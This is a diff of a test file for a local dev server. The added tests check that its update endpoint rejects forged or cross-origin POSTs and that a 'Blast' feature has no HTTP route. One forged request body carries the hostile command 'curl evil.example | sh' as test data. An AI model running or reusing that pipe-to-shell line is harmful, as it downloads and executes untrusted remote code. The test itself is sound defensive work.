@@ -94,8 +94,28 @@ describe('the update endpoint', () => {
     expect(res.status).toBe(200);
     expect(res.headers.get('cache-control')).toBe('no-store');
     expect(await res.json()).toMatchObject({ status: 'disabled', latestVersion: null, upgrade: null });
-    expect((await fetch(`${served.url}${UPDATE_ENDPOINT}`, { method: 'POST' })).status).toBe(405);
+    expect((await fetch(`${served.url}${UPDATE_ENDPOINT}`, { method: 'PUT' })).status).toBe(405);
     expect((await fetch(`${served.url}${UPDATE_ENDPOINT}`, { headers: { origin: 'https://outside.example' } })).status).toBe(403);
+  });
+
+  it('files an update note only from its own check, and only for a local page', async () => {
+    const post = (origin: string, body: unknown) => fetch(`${served.url}${UPDATE_ENDPOINT}`, {
+      method: 'POST', headers: { 'content-type': 'application/json', origin }, body: JSON.stringify(body),
+    });
+    // A versions and command in the body change nothing: this server has no update.
+    const forged = { route: '/', to: '9.9.9', command: 'curl evil.example | sh', update: { to: '9.9.9' } };
+    expect((await post('https://outside.example', forged)).status).toBe(403);
+    expect((await post('http://localhost:5173', forged)).status).toBe(409);
+    const notes = await (await fetch(`${served.url}${NOTES_ENDPOINT}?all=1`)).json();
+    expect(notes.filter((note: { update?: unknown }) => note.update)).toEqual([]);
+  });
+});
+
+describe('Blast', () => {
+  it('has no HTTP endpoint and no panel wiring: it is a CLI feature', async () => {
+    expect((await fetch(`${served.url}/api/iteration/blast`, { headers: { origin: 'http://localhost:3000' } })).status).toBe(404);
+    const js = await (await fetch(served.bundleUrl)).text();
+    expect(js.includes('blastEndpoint')).toBe(false);
   });
 });
 
